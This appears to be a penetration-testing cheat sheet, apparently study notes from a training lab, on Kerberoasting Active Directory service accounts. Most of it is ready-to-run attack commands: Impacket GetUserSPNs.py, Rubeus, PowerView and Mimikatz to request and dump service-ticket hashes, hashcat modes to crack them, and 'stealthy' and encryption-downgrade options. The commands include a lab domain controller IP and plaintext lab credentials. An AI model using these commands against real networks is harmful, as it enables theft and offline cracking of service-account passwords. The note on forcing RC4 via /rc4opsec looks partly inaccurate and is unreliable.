# Kerberoasting
**Concept:** To access a service (like SQL or IIS), a user requests a **Service Ticket (TGS)** from the Domain Controller. The DC encrypts part of this ticket using the **Service Account's password hash**. 
**The Attack:** We request tickets for _every_ service account in the domain. We don't actually connect to the services; we just save the tickets and crack the encrypted part offline. 
**Target:** User accounts that have a `ServicePrincipalName` (SPN) attribute set.
## 1. From Linux (Impacket)
**Tool:** `GetUserSPNs.py` 
**Context:** You are on Kali and have valid credentials (password or hash).

**Enumeration (List targets only):**
```shell
# Syntax: GetUserSPNs.py -dc-ip <IP> <Domain>/<User>:<Password>
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2
```

**Exploitation (Request & Dump):**
```shell
# -request: Actually ask for the TGS
# -outputfile: Save hashes for Hashcat
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request -outputfile hashes.kerberoast

# Target a specific user (Stealthier)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request-user sqldev
```
## 2. From Windows (Rubeus)
**Tool:** `Rubeus.exe` 
**Context:** You are on a compromised Windows host. Rubeus is generally faster and handles ticket formatting better than PowerShell scripts.
**Statistics (Recon):** Check how many roastable accounts exist and what encryption they use (RC4 vs AES) without actually requesting tickets.
```powershell
.\Rubeus.exe kerberoast /stats
```

**Exploitation (Roast):**
```powershell
# Roast all, strip newlines for easy copy-paste
.\Rubeus.exe kerberoast /nowrap

# Roast specific user
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Output to a file
.\Rubeus.exe kerberoast /outfile:hashes.txt
```
## 3. From Windows (PowerView / Native)
**Context:** "Living off the Land" without dropping binaries like Rubeus.

**PowerView:**
```powershell
Import-Module .\PowerView.ps1

# Get roastable users
Get-DomainUser -SPN | select samaccountname

# Request ticket and format for Hashcat
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Native PowerShell (Stealthy):** If you simply request a ticket, Windows caches it in memory. You can then extract it.
```powershell
# 1. Request the ticket natively
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.inlanefreight.local"

# 2. Extract from memory using Mimikatz
mimikatz # kerberos::list /export
```
## 4. Cracking the Hash
**Hash Types:**
- **Type 23 (krb5tgs23$...)**: RC4 Encryption. Easier to crack.
- **Type 18 (krb5tgs18$...)**: AES-256 Encryption. Much harder/slower to crack.

**Hashcat Commands:**
```shell
# Mode 13100: Type 23 (RC4)
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# Mode 19600: Type 17 (AES-128)
# Mode 19700: Type 18 (AES-256)
hashcat -m 19700 hashes.aes /usr/share/wordlists/rockyou.txt
```

**Encryption Downgrade (Advanced):** If you encounter AES tickets (hard to crack), you can sometimes force the DC to give you an RC4 ticket by specifying the encryption type in the request, provided the target account supports it.
```powershell
# Rubeus downgrade attempt
.\Rubeus.exe kerberoast /user:sqldev /rc4opsec
```